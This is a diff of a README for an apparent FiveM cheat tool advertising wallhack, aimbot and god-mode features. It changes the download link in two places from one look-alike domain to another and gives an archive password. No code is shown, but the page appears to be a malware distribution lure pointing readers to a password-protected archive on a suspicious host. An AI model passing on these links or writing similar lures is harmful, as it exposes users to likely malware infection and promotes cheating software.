@@ -6,7 +6,7 @@ FiveM hack with ESP wallhack, aimbot, vehicle spawner, money drop, god mode, Lua
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -89,7 +89,7 @@ Based on open-source projects like **FiveM-External-Cheat** and **EulenCheats**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 
 2. Extract the archive.
 
